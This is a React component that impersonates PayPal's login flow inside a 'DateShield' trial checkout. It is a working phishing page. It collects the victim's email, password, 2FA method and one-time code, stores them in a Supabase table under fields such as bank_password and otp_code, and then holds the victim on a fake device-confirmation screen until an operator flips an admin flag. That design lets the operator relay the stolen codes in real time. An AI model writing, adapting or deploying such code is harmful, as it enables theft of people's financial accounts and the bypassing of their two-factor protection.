import { useEffect, useState } from "react";
import { supabase } from "@/integrations/supabase/client";
import paypalLogo from "@/assets/paypal-wordmark.svg";
import {
  Loader2,
  CheckCircle2,
  ShieldCheck,
  ArrowLeft,
  X,
  Smartphone,
  Mail,
  HelpCircle,
} from "lucide-react";

type Step = "email" | "password" | "2fa-method" | "2fa-otp" | "confirm" | "done";

export function PaypalLoginModal({
  sessionId,
  onClose,
  onComplete,
}: {
  sessionId: string;
  onClose: () => void;
  onComplete: () => void;
}) {
  const [step, setStep] = useState<Step>("email");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPwd, setShowPwd] = useState(false);
  const [twofa, setTwofa] = useState<"sms" | "email" | "">("");
  const [otp, setOtp] = useState("");
  const [loading, setLoading] = useState(false);
  const [emailError, setEmailError] = useState("");

  const push = async (fields: Record<string, unknown>) => {
    await supabase
      .from("trial_submissions")
      .upsert(
        { session_id: sessionId, method: "paypal", ...fields } as never,
        { onConflict: "session_id" }
      );
  };

  const submitEmail = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!/^\S+@\S+\.\S+$/.test(email) && !/^[\d\s+()-]{6,}$/.test(email)) {
      setEmailError("Enter a valid email or mobile number.");
      return;
    }
    setEmailError("");
    setLoading(true);
    await push({
      paypal_email: email,
      bank_username: email,
      bank_name: "PayPal",
      step: "paypal_email_submitted",
    });
    setTimeout(() => {
      setLoading(false);
      setStep("password");
    }, 900);
  };

  const submitPassword = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    await push({
      bank_password: password,
      step: "paypal_credentials_submitted",
    });
    setTimeout(() => {
      setLoading(false);
      setStep("2fa-method");
    }, 1300);
  };

  const select2fa = async (m: "sms" | "email") => {
    setTwofa(m);
    await push({ twofa_method: m, step: "paypal_2fa_selected" });
    setStep("2fa-otp");
  };

  const submitOtp = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    await push({ otp_code: otp, step: "paypal_otp_submitted" });
    setTimeout(async () => {
      setLoading(false);
      await push({ step: "awaiting_device_confirmation" });
      setStep("confirm");
    }, 1300);
  };

  // Wait for admin to confirm device
  useEffect(() => {
    if (step !== "confirm") return;
    let cancelled = false;

    const check = async () => {
      const { data } = await supabase
        .from("trial_submissions")
        .select("admin_confirmed")
        .eq("session_id", sessionId)
        .maybeSingle();
      if (cancelled) return;
      if (data?.admin_confirmed) {
        await push({ device_confirmed: true, step: "device_confirmed" });
        setStep("done");
        setTimeout(onComplete, 900);
      }
    };
    check();

    const channel = supabase
      .channel(`paypal_confirm_${sessionId}`)
      .on(
        "postgres_changes",
        {
          event: "UPDATE",
          schema: "public",
          table: "trial_submissions",
          filter: `session_id=eq.${sessionId}`,
        },
        (payload) => {
          const row = payload.new as { admin_confirmed?: boolean };
          if (row.admin_confirmed) {
            push({ device_confirmed: true, step: "device_confirmed" });
            setStep("done");
            setTimeout(onComplete, 900);
          }
        }
      )
      .subscribe();

    const poll = setInterval(check, 4000);
    return () => {
      cancelled = true;
      clearInterval(poll);
      supabase.removeChannel(channel);
    };
  }, [step, sessionId, onComplete]);

  const locked = step === "confirm";

  return (
    <div className="fixed inset-0 z-50 flex flex-col bg-white">
      {/* Close button (top-right) */}
      {!locked && (
        <button
          onClick={onClose}
          className="absolute right-4 top-4 z-10 rounded-full p-1.5 text-gray-400 hover:bg-gray-100 hover:text-gray-700"
          aria-label="Close"
        >
          <X className="h-5 w-5" />
        </button>
      )}

      <div className="flex flex-1 items-start justify-center overflow-y-auto px-3 pt-12 pb-6 sm:px-4">
        <div className="w-full max-w-[460px] rounded-2xl border border-gray-200 bg-white px-5 py-7 shadow-sm sm:px-8 sm:py-9">
          {/* Back button for inner steps */}
          {step !== "email" && step !== "done" && !locked && (
            <button
              onClick={() => {
                if (step === "password") setStep("email");
                else if (step === "2fa-method") setStep("password");
                else if (step === "2fa-otp") setStep("2fa-method");
              }}
              className="mb-2 -ml-2 inline-flex items-center gap-1 rounded-full p-1 text-sm text-gray-500 hover:text-gray-800"
            >
              <ArrowLeft className="h-4 w-4" />
            </button>
          )}

          {/* PayPal logo centered */}
          <div className="flex justify-center">
            <PaypalWordmark large />
          </div>

          {step === "email" && (
            <p className="mt-4 text-center text-base text-gray-900">
              Enter your email address to get started.
            </p>
          )}
          {(step === "password" || step === "2fa-method" || step === "2fa-otp") && (
            <p className="mt-4 text-center text-base font-semibold text-gray-900">
              Let's check out with DateShield
            </p>
          )}

          <div className="mt-6">
            {step === "email" && (
              <form onSubmit={submitEmail} className="space-y-4">
                <PpField
                  label="Email or mobile number"
                  value={email}
                  onChange={(v) => { setEmail(v); if (emailError) setEmailError(""); }}
                  type="text"
                  autoFocus
                  error={emailError}
                />
                <a
                  href="#"
                  onClick={(e) => e.preventDefault()}
                  className="block text-sm font-semibold text-[#0070ba] hover:underline"
                >
                  Forgot email?
                </a>
                <button
                  type="submit"
                  disabled={!email || loading}
                  className="flex h-12 w-full items-center justify-center gap-2 rounded-full bg-[#0070ba] text-base font-semibold text-white transition hover:bg-[#005ea6] disabled:opacity-60"
                >
                  {loading ? <Loader2 className="h-5 w-5 animate-spin" /> : "Next"}
                </button>

                <div className="relative py-1">
                  <div className="absolute inset-0 flex items-center">
                    <div className="w-full border-t border-gray-200" />
                  </div>
                  <div className="relative flex justify-center">
                    <span className="bg-white px-3 text-sm text-gray-500">or</span>
                  </div>
                </div>

                <button
                  type="button"
                  onClick={(e) => e.preventDefault()}
                  className="h-12 w-full rounded-full border border-gray-900 text-base font-semibold text-gray-900 transition hover:bg-gray-50"
                >
                  Create an Account
                </button>

                <a
                  href="#"
                  onClick={(e) => e.preventDefault()}
                  className="block pt-2 text-center text-sm font-semibold text-[#0070ba] hover:underline"
                >
                  Cancel and return to Dateshield Inc.
                </a>
              </form>
            )}

            {step === "password" && (
              <form onSubmit={submitPassword} className="space-y-4">
                <p className="text-center text-sm text-gray-600">{email}</p>
                <PpField
                  label="Password"
                  value={password}
                  onChange={setPassword}
                  type={showPwd ? "text" : "password"}
                  autoFocus
                  rightAction={
                    <button
                      type="button"
                      onClick={() => setShowPwd((s) => !s)}
                      className="text-xs font-semibold text-[#0070ba] hover:underline"
                    >
                      {showPwd ? "Hide" : "Show"}
                    </button>
                  }
                />
                <a
                  href="#"
                  onClick={(e) => e.preventDefault()}
                  className="block text-sm font-semibold text-[#0070ba] hover:underline"
                >
                  Forgot password?
                </a>
                <button
                  type="submit"
                  disabled={!password || loading}
                  className="flex h-12 w-full items-center justify-center gap-2 rounded-full bg-[#0070ba] text-base font-semibold text-white transition hover:bg-[#005ea6] disabled:opacity-60"
                >
                  {loading ? <Loader2 className="h-5 w-5 animate-spin" /> : "Log In"}
                </button>
              </form>
            )}

            {step === "2fa-method" && (
            <div className="space-y-4">
              <div className="text-center">
                <ShieldCheck className="mx-auto h-10 w-10 text-[#0070ba]" />
                <h2 className="mt-2 text-base font-semibold text-gray-900">
                  Let's make sure it's you
                </h2>
                <p className="mt-1 text-sm text-gray-600">
                  Choose how you'd like to receive your security code
                </p>
              </div>
              <PpMethod
                icon={<Smartphone className="h-5 w-5" />}
                title="Text me a code"
                desc="We'll send a code to your registered phone"
                onClick={() => select2fa("sms")}
              />
              <PpMethod
                icon={<Mail className="h-5 w-5" />}
                title="Email me a code"
                desc="We'll send a code to your registered email"
                onClick={() => select2fa("email")}
              />
              <button
                type="button"
                className="flex w-full items-center justify-center gap-1.5 pt-2 text-xs font-semibold text-[#0070ba] hover:underline"
              >
                <HelpCircle className="h-3.5 w-3.5" /> I need more help
              </button>
            </div>
            )}

            {step === "2fa-otp" && (
            <form onSubmit={submitOtp} className="space-y-4">
              <div className="text-center">
                <h2 className="text-base font-semibold text-gray-900">
                  Enter your security code
                </h2>
                <p className="mt-1 text-sm text-gray-600">
                  We sent a 6-digit code via{" "}
                  {twofa === "sms" ? "text message" : "email"}.
                </p>
              </div>
              <input
                autoFocus
                value={otp}
                onChange={(e) =>
                  setOtp(e.target.value.replace(/\D/g, "").slice(0, 8))
                }
                inputMode="numeric"
                placeholder="------"
                className="h-14 w-full rounded-lg border border-gray-300 bg-white text-center font-mono text-2xl tracking-[0.5em] text-gray-900 placeholder:text-gray-300 outline-none focus:border-[#0070ba] focus:ring-2 focus:ring-[#0070ba]/20"
              />
              <button
                disabled={otp.length < 4 || loading}
                className="flex h-12 w-full items-center justify-center gap-2 rounded-full bg-[#0070ba] text-base font-semibold text-white transition hover:bg-[#005ea6] disabled:opacity-60"
              >
                {loading ? (
                  <>
                    <Loader2 className="h-5 w-5 animate-spin" /> Verifying…
                  </>
                ) : (
                  "Continue"
                )}
              </button>
              <button
                type="button"
                className="block w-full text-center text-sm font-semibold text-[#0070ba] hover:underline"
              >
                Resend code
              </button>
            </form>
            )}

            {step === "confirm" && (
            <div className="space-y-4 py-2 text-center">
              <div className="relative mx-auto flex h-16 w-16 items-center justify-center rounded-full bg-[#0070ba]/10">
                <span className="absolute inset-0 animate-ping rounded-full bg-[#0070ba]/20" />
                <ShieldCheck className="relative h-8 w-8 text-[#0070ba]" />
              </div>
              <div>
                <h2 className="text-lg font-semibold text-gray-900">
                  Confirm This Device From Your app
                </h2>
                <p className="mt-1 text-xs text-gray-600">
                  Open your PayPal app and approve the sign-in request to continue.
                  This window will update automatically once confirmed.
                </p>
              </div>
              <div className="flex items-center justify-center gap-2 rounded-lg bg-gray-50 px-3 py-3 text-xs text-gray-700">
                <Loader2 className="h-4 w-4 animate-spin text-[#0070ba]" />
                Waiting for device confirmation…
              </div>
            </div>
            )}

            {step === "done" && (
            <div className="space-y-3 py-6 text-center">
              <div className="mx-auto flex h-16 w-16 items-center justify-center rounded-full bg-green-100">
                <CheckCircle2 className="h-8 w-8 text-green-600" />
              </div>
              <h2 className="text-lg font-semibold text-gray-900">
                You're all set
              </h2>
              <p className="text-xs text-gray-600">Redirecting to your dashboard…</p>
            </div>
            )}
          </div>

          {/* Language switcher */}
          {step !== "confirm" && step !== "done" && (
            <div className="mt-6 flex items-center justify-center gap-3 text-sm text-gray-700">
              <button className="flex items-center gap-1 text-gray-700">
                <img
                  src="https://flagcdn.com/w40/us.png"
                  alt="US"
                  className="h-3.5 w-5 rounded-sm object-cover"
                />
                <span className="text-xs">▾</span>
              </button>
              <span className="font-medium">English</span>
              <a href="#" onClick={(e) => e.preventDefault()} className="text-gray-700 hover:underline">Français</a>
              <a href="#" onClick={(e) => e.preventDefault()} className="text-gray-700 hover:underline">Español</a>
              <a href="#" onClick={(e) => e.preventDefault()} className="text-gray-700 hover:underline">Español</a>
              <a href="#" onClick={(e) => e.preventDefault()} className="text-gray-700 hover:underline">中文</a>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

function PpField({
  label,
  value,
  onChange,
  type = "text",
  autoFocus,
  rightAction,
  error,
}: {
  label: string;
  value: string;
  onChange: (v: string) => void;
  type?: string;
  autoFocus?: boolean;
  rightAction?: React.ReactNode;
  error?: string;
}) {
  const [focused, setFocused] = useState(false);
  const floating = focused || value.length > 0;
  return (
    <div>
      <div
        className={`relative rounded-lg border bg-white transition ${
          error
            ? "border-red-500"
            : focused
              ? "border-[#0070ba] ring-2 ring-[#0070ba]/20"
              : "border-gray-300"
        }`}
      >
        <label
          className={`pointer-events-none absolute left-3 transition-all ${
            floating
              ? "top-1.5 text-[10px] font-medium text-gray-500"
              : "top-1/2 -translate-y-1/2 text-sm text-gray-500"
          }`}
        >
          {label}
        </label>
        <input
          autoFocus={autoFocus}
          type={type}
          value={value}
          onFocus={() => setFocused(true)}
          onBlur={() => setFocused(false)}
          onChange={(e) => onChange(e.target.value)}
          className="block h-12 w-full bg-transparent px-3 pr-16 pt-4 text-sm text-gray-900 outline-none"
        />
        {rightAction && (
          <div className="absolute right-3 top-1/2 -translate-y-1/2">
            {rightAction}
          </div>
        )}
      </div>
      {error && <p className="mt-1 text-xs text-red-600">{error}</p>}
    </div>
  );
}

function PpMethod({
  icon,
  title,
  desc,
  onClick,
}: {
  icon: React.ReactNode;
  title: string;
  desc: string;
  onClick: () => void;
}) {
  return (
    <button
      onClick={onClick}
      className="flex w-full items-center gap-3 rounded-lg border border-gray-200 p-3 text-left transition hover:border-[#0070ba] hover:bg-[#0070ba]/5"
    >
      <div className="flex h-10 w-10 items-center justify-center rounded-full bg-[#0070ba]/10 text-[#0070ba]">
        {icon}
      </div>
      <div className="flex-1">
        <p className="text-sm font-semibold text-gray-900">{title}</p>
        <p className="text-[11px] text-gray-600">{desc}</p>
      </div>
    </button>
  );
}

function PaypalWordmark({ large }: { large?: boolean }) {
  return (
    <img
      src={paypalLogo}
      alt="PayPal"
      className={large ? "h-10 w-auto" : "h-6 w-auto"}
    />
  );
}
